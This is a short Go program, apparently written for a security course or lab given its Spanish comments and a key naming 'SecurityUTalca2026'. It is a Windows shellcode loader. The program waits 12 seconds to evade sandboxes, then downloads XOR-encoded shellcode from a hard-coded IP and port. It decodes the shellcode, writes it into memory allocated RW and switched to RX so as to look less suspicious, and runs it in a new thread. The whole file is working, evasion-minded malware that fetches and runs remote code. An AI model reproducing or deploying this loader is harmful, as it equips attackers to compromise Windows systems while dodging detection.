package main

import (
	"io"
	"net/http"
	"syscall"
	"time"
	"unsafe"
)

const (
	serverHost = "195.0.1.5" // Cambiar por IP real de Parrot
	serverPort = "8080"
)

var xorKey = []byte("SecurityUTalca2026")

func xor(d, k []byte) []byte {
	out := make([]byte, len(d))
	for i, b := range d {
		out[i] = b ^ k[i%len(k)]
	}
	return out
}

func main() {
	time.Sleep(12 * time.Second) // anti-sandbox

	resp, err := http.Get("http://" + serverHost + ":" + serverPort + "/sc")
	if err != nil {
		return
	}
	defer resp.Body.Close()
	enc, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}

	sc := xor(enc, xorKey)
	size := uintptr(len(sc))

	k32 := syscall.NewLazyDLL("kernel32.dll")
	vAlloc := k32.NewProc("VirtualAlloc")
	vProtect := k32.NewProc("VirtualProtect")
	cThread := k32.NewProc("CreateThread")
	wfso := k32.NewProc("WaitForSingleObject")

	// Allocar como RW primero (menos sospechoso que RWX directo)
	addr, _, _ := vAlloc.Call(0, size, 0x3000, 0x04) // PAGE_READWRITE
	if addr == 0 {
		return
	}

	// Copiar shellcode a memoria
	dst := (*[1 << 30]byte)(unsafe.Pointer(addr))
	copy(dst[:size], sc)

	// Cambiar a RX antes de ejecutar
	var old uint32
	vProtect.Call(addr, size, 0x20, uintptr(unsafe.Pointer(&old))) // PAGE_EXECUTE_READ

	// Ejecutar en hilo nuevo
	h, _, _ := cThread.Call(0, 0, addr, 0, 0, 0)
	wfso.Call(h, 0xFFFFFFFF)
}
